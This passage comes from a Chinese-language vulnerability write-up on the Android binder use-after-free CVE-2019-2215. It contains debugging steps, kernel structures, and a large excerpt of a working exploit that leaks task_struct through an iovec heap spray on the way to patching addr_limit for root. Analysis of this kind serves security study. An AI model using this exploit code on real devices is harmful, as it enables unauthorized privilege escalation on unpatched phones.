</span></span><span class=line><span class=cl>        <span class=n>__list_del</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>prev</span><span class=p>,</span> <span class=n>entry</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>__list_del</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span> <span class=n>prev</span><span class=p>,</span> <span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span> <span class=n>next</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>next</span><span class=o>-&gt;</span><span class=n>prev</span> <span class=o>=</span> <span class=n>prev</span><span class=p>;</span> <span class=c1>//unlink操作
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>WRITE_ONCE</span><span class=p>(</span><span class=n>prev</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>,</span> <span class=n>next</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>将<code>binder_thread->wait.head</code>的指针写入<code>binder_thread->wait.head.prev</code>和<code>binder_thread->wait.head.next</code>。</p><h4 id=poc调试分析>Poc调试分析</h4><p>这里手上没有直接能用的设备，用的模拟器调试。可直接按照<a class=link href=https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html#software-requirements target=_blank rel=noopener>这个教程</a>的配置调试。不过这个教程关闭了一些保护，使得利用要简单些，不过过程是差不多一样的。</p><p>编译完goldfish后启动<code>emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S</code>等待qemu的连接。</p><p>gdb启动<code>gdb -quiet vmlinux -ex 'target remote :1234'</code> 键入c继续启动模拟器。</p><p>等待模拟器完全启动后编译poc push进模拟器。</p><p>binder_thread释放之前，偏移a8处为<code>wait.head</code>的值，这里我们拥有内核源码以及编译好的vmliux，所以可以直接算出来<code>wait.head</code>相对于binder_thread地址的偏移量。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/b1.png loading=lazy></p><p>free之后未unlink之前binder_thread的值一样未变。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/b2.png loading=lazy></p><p>unlink之后，binder_thread->wait.head写入<code>binder_thread->wait.head.next</code> and <code>binder_thread->wait.head.prev</code>两个指针。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/b3.png loading=lazy></p><p>在未开启KASan的设备上我们看不到任何奔溃。但是调试时我们能看到确实触发了漏洞。</p><h3 id=0x03-漏洞利用>0x03 漏洞利用</h3><p>漏洞t_thread结构体如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>binder_thread</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_proc</span> <span class=o>*</span><span class=n>proc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>rb_node</span> <span class=n>rb_node</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>list_head</span> <span class=n>waiting_thread_node</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>pid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>looper</span><span class=p>;</span>              <span class=cm>/* only modified by this thread */</span>
</span></span><span class=line><span class=cl>        <span class=kt>bool</span> <span class=n>looper_need_return</span><span class=p>;</span> <span class=cm>/* can be written by other thread */</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_transaction</span> <span class=o>*</span><span class=n>transaction_stack</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>list_head</span> <span class=n>todo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>bool</span> <span class=n>process_todo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_error</span> <span class=n>return_error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_error</span> <span class=n>reply_error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>wait_queue_head_t</span> <span class=n>wait</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_stats</span> <span class=n>stats</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>atomic_t</span> <span class=n>tmp_ref</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>bool</span> <span class=n>is_dead</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>task_struct</span> <span class=o>*</span><span class=n>task</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>注意看该结构体中有个task成员，为task_struct类型。我们首先要做的就是泄露这个结构体的地址，将它改为NULL之后，执行提权语句。下面根据<a class=link href=https://github.com/sharif-dev/AndroidKernelVulnerability/blob/master/exploit.cpp target=_blank rel=noopener>exp</a>分析整个提权的流程。</p><h4 id=patch-addr_limit>patch addr_limit</h4><p>阻止我们拿到权限的第一道关卡为task_struct结构体成员thread_info中的addr_limit（在x86_64上是直接作为task_struct的成员），用于隔离内核空间和用户空间。如果我们能控制它的值，相当于我们能完全的访问内核空间。所以第一步就是把addr_limit patch掉。</p><p>想要patch掉addr_limit，得先泄露出task_struct的地址，再将值改为<code>0xFFFFFFFFFFFFFFFE</code>。后面再说为什么要改为这个值。</p><p>这里先了解一下<strong>vectored I/O</strong>，也称为分散/聚集 I/O，是一种可以在单次系统调用中对多个缓冲区输入输出的方法，可以把多个缓冲区的数据写到单个数据流，也可以把单个数据流读到多个缓冲区中。与线性 I/O 相比，vectored I/O有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。支持原子性。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200629154204.png loading=lazy></p><p>readv() 函数从文件描述符 fd 中读取 count 个段 (segment) (一个段即一个 iovec 结构体）到参数 iov 所指定的缓冲区中。</p><p>write() 函数从参数 iov 指定的缓冲区中读取 count 个段的数据，并写入 fd 中。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/uio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>ssize_t</span> <span class=nf>readv</span> <span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=o>*</span><span class=n>iov</span><span class=p>,</span><span class=n>vint</span> <span class=n>count</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>ssize_t</span> <span class=nf>writev</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span><span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=o>*</span><span class=n>iov</span><span class=p>,</span> <span class=kt>int</span> <span class=n>count</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>每个 iovec 结构体描述一个独立的，物理不连续的缓冲区，我们称其为段(segment)，每个iovec结构体相对较小，在64bit系统下iovec的大小仅为0x10。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>iovec</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=n>__user</span> <span class=o>*</span><span class=n>iov_base</span><span class=p>;</span>    <span class=cm>/* BSD uses caddr_t (1003.1g requires void *) */</span>
</span></span><span class=line><span class=cl>    <span class=n>__kernel_size_t</span> <span class=n>iov_len</span><span class=p>;</span> <span class=cm>/* Must be size_t (1003.1g) */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>如何泄露出task_struct？看了几个exp，都用的是<code>struct iovec</code>去占位覆盖前面释放的binder_thread。这也是Project Zero的做法。这个方法最初是由Keen实验室提出的，iovec具有一些小特性使得它很适合用来作为攻击的媒介：</p><ol><li>在64bit系统下只有0x10的大小</li><li>容易控制它的成员iov_base和iov_len。</li><li>可以控制写入的个数控制iovec最终进入哪个kmalloc缓存</li><li>它有一个指向缓冲区的指针和一个长度，这是使用unlink进行破坏的理想字段</li></ol><p>可通过readv、writev、recvmsg、sendmsg等系统调用和iovec是实现linux下的Vectored I/O。在漏洞利用中我们可以利用来绕过检查，对已释放的空间进行占位布局堆风水。</p><p>看看exp如何如来泄露信息，作者写了很详细的注释：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>leakTaskStruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>pipe_fd</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesRead</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=kt>char</span> <span class=n>dataBuffer</span><span class=p>[</span><span class=n>PAGE_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>iovec</span> <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_COUNT</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=n>nullptr</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Get binder fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupBinder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Create event poll
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupEventPoll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// We are going to use iovec for scoped read/write,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we need to make sure that iovec stays in the kernel
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// before we trigger the unlink after binder_thread has
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// been freed.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// One way to achieve this is by using the blocking APIs
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// in Linux kernel. Such APIs are read, write, etc on pipe.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// Setup pipe for iovec
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] Unable to create pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Pipe created successfully</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// pipe_fd[0] = read fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// pipe_fd[1] = write fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Default size of pipe is 65536 = 0x10000 = 64KB
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// This is way much of data that we care about
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Let&#39;s reduce the size of pipe to 0x1000
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>fcntl</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>F_SETPIPE_SZ</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] Unable to change the pipe capacity</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Changed the pipe capacity to: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up iovecs</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// As we are overlapping binder_thread with iovec,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// binder_thread-&gt;wait.lock will align to iovecStack[10].io_base.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// If binder_thread-&gt;wait.lock is not 0 then the thread will get
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// stuck in trying to acquire the lock and the unlink operation
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// will not happen.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// To avoid this, we need to make sure that the overlapped data
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// should be set to 0.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we can pass a valid memory address whose lower 32bit value is 0,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// then we can avoid spin lock issue.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mmap4gbAlignedPage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>m_4gb_aligned_page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=n>PAGE_SIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x41414141</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=n>PAGE_SIZE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Now link the poll wait queue to binder thread wait queue
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>linkEventPollWaitQueueToBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We should trigger the unlink operation when we
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// have the binder_thread reallocated as iovec array
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Now fork
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>pid_t</span> <span class=n>childPid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>childPid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// child process
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// There is a race window between the unlink and blocking
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// in writev, so sleep for a while to ensure that we are
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// blocking in writev before the unlink happens
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Trigger the unlink operation on the reallocated chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>unlinkEventPollWaitQueueFromBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// First interesting iovec will read 0x1000 bytes of data.
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// This is just the junk data that we are not interested in
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>dataBuffer</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>dataBuffer</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>PAGE_SIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] CHILD: read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span><span class=p>,</span> <span class=n>nBytesRead</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// parent process
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// I have seen some races which hinders the reallocation.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// So, now freeing the binder_thread after fork.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>freeBinderThread</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Reallocate binder_thread as iovec array
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We need to make sure this writev call blocks
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// This will only happen when the pipe is already full
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// This print statement was ruining the reallocation,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// spent a night to figure this out. Commenting the
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// below line.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// INFO(&#34;[+] Reallocating binder_thread\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>writev</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>iovecStack</span><span class=p>,</span> <span class=n>IOVEC_COUNT</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// If the corruption was successful, the total bytes written
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// should be equal to 0x2000. This is because there are two
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// valid iovec and the length of each is 0x1000
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=n>PAGE_SIZE</span> <span class=o>*</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] writev failed. nBytesWritten: 0x%lx, expected: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>,</span> <span class=n>PAGE_SIZE</span> <span class=o>*</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Wrote 0x%lx bytes</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Now read the actual data from the corrupted iovec
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// This is the leaked data from kernel address space
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// and will contain the task_struct pointer
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>nBytesRead</span> <span class=o>=</span> <span class=n>read</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>dataBuffer</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>dataBuffer</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesRead</span> <span class=o>!=</span> <span class=n>PAGE_SIZE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] read failed. nBytesRead: 0x%lx, expected: 0x%x&#34;</span><span class=p>,</span> <span class=n>nBytesRead</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
